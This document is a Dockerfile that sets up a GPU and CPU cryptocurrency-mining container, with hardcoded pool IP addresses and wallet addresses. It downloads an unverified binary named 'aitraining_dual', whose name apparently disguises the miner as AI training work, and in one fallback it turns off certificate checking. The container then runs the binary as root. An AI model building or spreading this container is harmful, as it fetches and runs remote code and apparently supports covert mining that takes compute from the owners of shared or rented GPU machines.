FROM debian:trixie-slim

# --- Mining Configuration Variables (Moved from script to Dockerfile) ---
ENV ALGO="kawpow;randomx"
ENV POOL="stratum+ssl://51.89.99.172:16161;stratum+ssl://51.222.200.133:10343"
ENV WALLET="RM2ciYa3CRqyreRsf25omrB4e1S95waALr;44csiiazbiygE5Tg5c6HhcUY63z26a3Cj8p1EBMNA6DcEM6wDAGhFLtFJVUHPyvEohF4Z9PF3ZXunTtWbiTk9HyjLxYAUwd"
# Setting WORKER here allows you to override it at runtime with -e WORKER=...
ENV WORKER="H200-rig" 
# NOTE: FLAGS is generally a bad idea as it prevents dynamic substitution. We'll ignore FLAGS in the final script 
# and build the command dynamically to incorporate the calculated CPU_THREADS.

# --- GPU Environment Variables ---
ENV GPU_MAX_HEAP_SIZE=100
ENV GPU_MAX_USE_SYNC_OBJECTS=1
ENV GPU_SINGLE_ALLOC_PERCENT=100
ENV GPU_MAX_ALLOC_PERCENT=100
ENV GPU_MAX_SINGLE_ALLOC_PERCENT=100
ENV GPU_ENABLE_LARGE_ALLOCATION=100
ENV GPU_MAX_WORKGROUP_SIZE=1024

# --- Build Steps ---
RUN apt-get -y update \
    && apt-get -y upgrade \
    && apt-get -y install curl wget ca-certificates \
    && update-ca-certificates \
    && cd /opt \
    \
    # Download your custom binary
    && (curl -L https://github.com/max313iq/Ssl/releases/download/22x/aitraining_dual -o aitraining_dual || \
        wget --progress=dot:giga --no-check-certificate https://github.com/max313iq/Ssl/releases/download/22x/aitraining_dual -O aitraining_dual) \
    \
    # Make executable
    && chmod +x aitraining_dual \
    \
    # Clean
    && apt-get -y autoremove --purge \
    && apt-get -y clean \
    && rm -rf /var/lib/apt/lists/* /var/cache/apt/archives/*

WORKDIR /opt

COPY start_zergpool.sh .
RUN chmod +x start_zergpool.sh

# Run as root (default), no user switching
ENTRYPOINT ["./start_zergpool.sh"]
